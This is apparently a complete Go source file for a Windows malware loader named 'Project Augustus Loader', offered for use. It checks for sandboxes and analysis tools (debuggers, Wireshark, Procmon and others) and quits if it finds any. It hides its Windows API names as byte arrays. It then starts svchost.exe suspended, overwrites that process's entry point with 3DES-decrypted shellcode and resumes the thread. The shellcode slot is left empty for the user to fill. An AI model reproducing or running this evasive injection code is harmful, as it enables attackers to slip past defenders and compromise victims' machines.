/*
            Project Augustus Loader
                VERSION: 1.0
 AUTHOR: @tunnelgre - https://twitter.com/tunnelgre
	              

*/

package main

import (
	"net/http"
	"crypto/cipher"
	"crypto/des"
	"fmt"
	"os"
	"os/exec"
	"strings"
	"log"
	"syscall"
	"unsafe"
	"encoding/binary"
	"runtime"
  	"time"
)

type PROCESS_BASIC_INFORMATION struct {
	Reserved1    uintptr
	PebAddress   uintptr
	Reserved2    uintptr
	Reserved3    uintptr
	UniquePid    uintptr
	MoreReserved uintptr
}

type memStatusEx struct {
    dwLength        uint32
    dwMemoryLoad    uint32
    ullTotalPhys    uint64
    ullAvailPhys    uint64
    ullTotalPageFile uint64
    ullAvailPageFile uint64
    ullTotalVirtual uint64
    ullAvailVirtual uint64
    ullAvailExtendedVirtual uint64
}


func checkProcesses() bool {
    processes := []string{
		"ollydbg.exe",
		"ProcessHacker.exe",
		"tcpview.exe",
		"autoruns.exe",
		"autorunsc.exe",
		"filemon.exe",
		"procmon.exe",
		"regmon.exe",
		"procexp.exe",
		"idaq.exe",
		"idaq64.exe",
		"ImmunityDebugger.exe",
		"Wireshark.exe",
		"dumpcap.exe",
		"HookExplorer.exe",
		"ImportREC.exe",
		"PETools.exe",
		"LordPE.exe",
		"SysInspector.exe",
		"proc_analyzer.exe",
		"sysAnalyzer.exe",
		"sniff_hit.exe",
		"windbg.exe",
		"joeboxcontrol.exe",
		"joeboxserver.exe",
		"ResourceHacker.exe",
		"x32dbg.exe",
		"x64dbg.exe",
		"Fiddler.exe",
		"httpdebugger.exe",
		"srvpost.exe",			  
	
    }

    for _, process := range processes {
        cmd := exec.Command("tasklist", "/FI", "IMAGENAME eq "+process)
        output, err := cmd.Output()
        if err != nil {
            return false
        }

        running := strings.Contains(string(output), process)
        if running {
            return true
        }
    }

    return false
}

func CheckSandbox() bool {
    cpuSandbox := runtime.NumCPU() <= 2

    procGlobalMemoryStatusEx := syscall.NewLazyDLL("kernel32.dll").NewProc("GlobalMemoryStatusEx")
    msx := &memStatusEx{
        dwLength: 64,
    }
    r1, _, _ := procGlobalMemoryStatusEx.Call(uintptr(unsafe.Pointer(msx)))
    memorySandbox := r1 == 0 || msx.ullTotalPhys < 4174967296

    procGetDiskFreeSpaceExW := syscall.NewLazyDLL("kernel32.dll").NewProc("GetDiskFreeSpaceExW")
    lpTotalNumberOfBytes := int64(0)
    diskret, _, _ := procGetDiskFreeSpaceExW.Call(
        uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("C:\\"))),
        uintptr(0),
        uintptr(unsafe.Pointer(&lpTotalNumberOfBytes)),
        uintptr(0),
    )
    diskSandbox := diskret == 0 || lpTotalNumberOfBytes < 60719476736

    client := http.Client{
        Timeout: 3 * time.Second,
    }
    _, err := client.Get("https://google.com")
    internetSandbox := err != nil

	processSandbox := checkProcesses()

    return cpuSandbox || memorySandbox || diskSandbox || internetSandbox || processSandbox
}

func main() {
    if CheckSandbox() {
        return 
    }
	epath := []byte{
		'C', ':', '\\', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 's', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 's', 'v', 'c', 'h', 'o', 's', 't', '.', 'e', 'x', 'e',
	}
	path := string(epath)  
	//insert here your encrypted shell
	sch := []byte("")
	key := []byte("")
	iv := []byte("")

	_, err := os.Stat(path)
	if err != nil {
		log.Fatal(err)
	}

	startupInfo := &syscall.StartupInfo{}
	processInfo := &syscall.ProcessInformation{}
	pathArray := append([]byte(path), byte(0))
	syscall.MustLoadDLL(string([]byte{
		'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l',
	})).MustFindProc(string([]byte{
		'C', 'r', 'e', 'a', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'A', 
	})).Call(0, uintptr(unsafe.Pointer(&pathArray[0])), 0, 0, 0, 0x4, 0, 0, uintptr(unsafe.Pointer(startupInfo)), uintptr(unsafe.Pointer(processInfo)))

	pointerSize := unsafe.Sizeof(uintptr(0))
	basicInfo := &PROCESS_BASIC_INFORMATION{}
	tmp := 0
	syscall.MustLoadDLL(string([]byte{
		'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l',
	})).MustFindProc(string([]byte{
		'Z', 'w', 'Q', 'u', 'e', 'r', 'y', 'I', 'n', 'f', 'o', 'r', 'm', 'a', 't', 'i', 'o', 'n', 'P', 'r', 'o', 'c', 'e', 's', 's', 
	})).Call(uintptr(processInfo.Process), 0, uintptr(unsafe.Pointer(basicInfo)), pointerSize*6, uintptr(unsafe.Pointer(&tmp)))

	imageBaseAddress := basicInfo.PebAddress + 0x10
	addressBuffer := make([]byte, pointerSize)
	read := 0
	syscall.MustLoadDLL(string([]byte{
		'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l',
	})).MustFindProc(string([]byte{
		'R', 'e', 'a', 'd', 'P', 'r', 'o', 'c', 'e', 's', 's', 'M', 'e', 'm', 'o', 'r', 'y', 
	})).Call(uintptr(processInfo.Process), imageBaseAddress, uintptr(unsafe.Pointer(&addressBuffer[0])), uintptr(len(addressBuffer)), uintptr(unsafe.Pointer(&read)))

	imageBaseValue := binary.LittleEndian.Uint64(addressBuffer)
	addressBuffer = make([]byte, 0x200)
	syscall.MustLoadDLL(string([]byte{
		'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l',
	})).MustFindProc(string([]byte{
		'R', 'e', 'a', 'd', 'P', 'r', 'o', 'c', 'e', 's', 's', 'M', 'e', 'm', 'o', 'r', 'y', 
	})).Call(uintptr(processInfo.Process), uintptr(imageBaseValue), uintptr(unsafe.Pointer(&addressBuffer[0])), uintptr(len(addressBuffer)), uintptr(unsafe.Pointer(&read)))

	lfaNewPos := addressBuffer[0x3c : 0x3c+0x4]
	lfanew := binary.LittleEndian.Uint32(lfaNewPos)
	entrypointOffset := lfanew + 0x28
	entrypointOffsetPos := addressBuffer[entrypointOffset : entrypointOffset+0x4]
	entrypointRVA := binary.LittleEndian.Uint32(entrypointOffsetPos)
	entrypointAddress := imageBaseValue + uint64(entrypointRVA)
	decryptedsch, err := decryptDES3(sch, key, iv)
		syscall.MustLoadDLL(string([]byte{
		'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l',
	})).MustFindProc(string([]byte{
		'W', 'r', 'i', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'M', 'e', 'm', 'o', 'r', 'y', 
	})).Call(uintptr(processInfo.Process), uintptr(entrypointAddress), uintptr(unsafe.Pointer(&decryptedsch[0])), uintptr(len(decryptedsch)), 0)

	syscall.MustLoadDLL(string([]byte{
		'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l',
	})).MustFindProc(string([]byte{
		'R', 'e', 's', 'u', 'm', 'e', 'T', 'h', 'r', 'e', 'a', 'd', 
	})).Call(uintptr(processInfo.Thread))
}


func decryptDES3(ciphertext, key, iv []byte) ([]byte, error) {
	block, err := des.NewTripleDESCipher(key)
	if err != nil {
		return nil, err
	}

	if len(ciphertext)%block.BlockSize() != 0 {
		return nil, fmt.Errorf("Ciphertext length is not a multiple of the block size")
	}

	mode := cipher.NewCBCDecrypter(block, iv)

	decrypted := make([]byte, len(ciphertext))
	mode.CryptBlocks(decrypted, ciphertext)

	decrypted = unpad(decrypted)

	return decrypted, nil
}

func unpad(data []byte) []byte {
	padding := int(data[len(data)-1])
	return data[:len(data)-padding]
}
